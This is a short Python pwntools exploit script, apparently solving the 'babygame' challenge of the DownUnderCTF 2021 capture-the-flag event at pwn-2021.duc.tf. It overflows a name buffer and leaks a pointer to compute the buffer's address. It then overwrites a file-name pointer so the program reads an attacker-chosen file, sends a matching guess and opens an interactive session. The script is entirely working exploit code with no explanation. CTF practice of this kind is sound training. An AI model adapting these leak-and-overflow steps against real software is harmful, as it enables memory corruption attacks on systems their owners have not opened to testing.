from pwn import *

s = remote('pwn-2021.duc.tf', 31907)
#s = process('./babygame')

#raw_input('DEBUG')

s.sendlineafter(b'name?\n', b'A' * 31)

s.sendlineafter(b'> ', b'2')

print(s.recvline())

dev_urandom_leak = int.from_bytes(s.recvline().strip(), byteorder = 'little', signed = False)
name = dev_urandom_leak - 0x2024 + 0x40A0

print(hex(dev_urandom_leak))
print(hex(name))

s.sendlineafter(b'> ', b'1')

print(p64(name)[:-2])

s.sendafter(b'to?\n', b'pwn' + p32(0) + b'A' * 25 + p64(name)[:-2])
#s.sendafter(b'to?\n', b'babygame' + p32(0) + b'A' * 20 + p64(dev_stdin)[:-2])

s.sendlineafter(b'> ', b'1337')

s.sendlineafter(b'guess: ', b'1179403647')

s.interactive()
